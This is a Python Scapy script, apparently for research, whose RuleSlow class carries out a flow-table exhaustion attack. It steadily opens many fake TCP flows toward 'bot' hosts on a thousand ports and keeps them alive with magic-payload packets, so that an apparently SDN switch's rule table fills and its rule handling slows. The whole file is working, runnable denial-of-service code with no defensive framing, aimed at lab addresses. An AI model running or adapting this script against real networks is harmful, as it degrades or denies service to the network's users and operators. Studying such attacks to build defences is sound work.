from scapy.all import *
import time
import sys
import random

class RuleSlow(object):
    def __init__(self, iface, hosts, ports, num_pkts=10, inc_flows=50, max_flows=1000, idle_time=3):
        super(RuleSlow, self).__init__()
        self.iface = iface
        self.count = 0
        # bot hosts 
        self.hosts = hosts
        # bot ports
        self.ports = ports
        # number of packets with different size for each connection
        self.num_pkts = num_pkts
        # increment of flow entries for each round of attack
        self.inc_flows = inc_flows
        # max flow entries during attacks 
        self.max_flows = max_flows
        self.idle_time = idle_time
        # all the backup connections for attacks
        self.all_conns = [(x, y) for x in hosts for y in ports]
        random.shuffle(self.all_conns)
        # send packets for current flows to keep them alive
        self.cur_flows = []
        # magic flag for constructing payloads, 1600bytes, enough.
        self.magic = b'\xde\xad\xfa\xce' * 400 
        # if stop or not  
        self.is_stop = False
        
    def _forward(self):
        # no enough flows to use 
        if len(self.all_conns) < self.inc_flows:
            print('no enough flows to use!')
            return
        if self.count >= self.max_flows:
            print('already overflow!')
            return 
        
        # assign new connections and remove them from all_conns
        new_conns = self.all_conns[:self.inc_flows]
        del self.all_conns[:self.inc_flows]
        
        # assign packets for the new connections
        for conn in new_conns:
            dst, dport = conn
            sizes = random.sample(range(100, 1400), self.num_pkts)
            loads = [self.magic[:size] for size in sizes]
            sport = random.randint(10000, 60000)
            pkts = [Ether()/IP(dst=dst)/TCP(sport=sport, dport=dport, flags="A")/x for x in loads]
            # append '{(ip, port): [pkt1, pkt2... pktn]}' to current flow recorder
            self.cur_flows.append({conn: pkts})
            
        self.count += self.inc_flows
        print('forward: {0}'.format(self.count))
        
    def _backward(self):
        if len(self.cur_flows) > self.inc_flows:
            del self.cur_flows[:self.inc_flows]
            self.count -= self.inc_flows
            print('backward: {0}'.format(self.count))
            
    def _dispatch(self):
        magic_idx = random.randrange(self.num_pkts)
        pkts_batch = []
        for flow in self.cur_flows:
            [(conn, pkts)] = flow.items()
            pkts_batch.append(pkts[magic_idx])
        sendp(pkts_batch, iface=self.iface, verbose=False)
            
    def run(self):
        dispatch_ival = 1
        while not self.is_stop:   
            if self.count < self.max_flows: 
                seed = random.random()
                if seed < 0.1:
                    self._backward()
                elif seed < 0.9:
                    self._forward() 
            idle_time = self.idle_time  
            while idle_time > 0:
                self._dispatch()
                time.sleep(dispatch_ival)
                idle_time -= dispatch_ival
        
    def stop(self):
        self.is_stop = True
        
if __name__ == '__main__':
    hosts = ['192.168.40.7', '192.168.40.8']
    ports = [port for port in range(10000, 11000)]
    
    try:
        for idx, param in enumerate(sys.argv):
            if param == '-e':
                iface = sys.argv[idx+1] 
            elif param == '-f':
                max_flows = int(sys.argv[idx+1]) 
        sf = RuleSlow(iface, hosts, ports, max_flows=max_flows)
        sf.run()
    except KeyboardInterrupt:
        sf.stop()
        print('ctrl + c to exit...')
